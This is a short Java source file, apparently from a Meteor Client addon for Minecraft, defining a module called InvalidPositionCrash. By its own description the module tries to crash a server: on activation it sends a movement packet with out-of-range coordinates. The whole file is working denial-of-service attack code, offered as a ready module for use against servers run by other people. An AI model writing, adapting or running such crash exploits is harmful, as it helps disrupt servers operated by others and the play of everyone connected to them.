package WideCat.MeteorCrashAddon.modules;

import WideCat.MeteorCrashAddon.MeteorCrashAddon;
import minegame159.meteorclient.systems.modules.Module;
import minegame159.meteorclient.utils.Utils;
import net.minecraft.network.packet.c2s.play.PlayerMoveC2SPacket;

import java.util.Objects;

public class InvalidPositionCrash extends Module {

    public InvalidPositionCrash() {
        super(MeteorCrashAddon.CATEGORY, "invalid-position-crash", "Attempts to crash the server by sending an invalid movement packet");
    }

    @Override
    public void onActivate() {
        if (Utils.canUpdate()) {
            PlayerMoveC2SPacket.PositionOnly p = new PlayerMoveC2SPacket.PositionOnly(20_000_000, 255, 20_000_000, true);
            Objects.requireNonNull(mc.getNetworkHandler()).sendPacket(p);
        }
        toggle();
    }

}